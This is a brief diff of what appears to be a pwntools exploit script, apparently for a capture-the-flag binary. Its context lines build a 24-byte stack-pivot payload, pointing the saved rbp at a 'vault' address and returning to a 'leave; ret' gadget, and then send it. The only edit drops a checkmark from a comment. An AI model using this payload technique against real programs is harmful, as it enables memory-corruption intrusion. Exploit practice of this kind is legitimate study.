@@ -83,7 +83,7 @@ payload = flat(
     p64(vault_addr),        # saved rbp — leave will set rsp here
     p64(leave_ret)          # rip — triggers pivot
 )
-# payload is exactly 24 bytes ✓
+# payload is exactly 24 bytes
 p.send(payload)
 
 #print(f"Payload length: {len(payload)}")
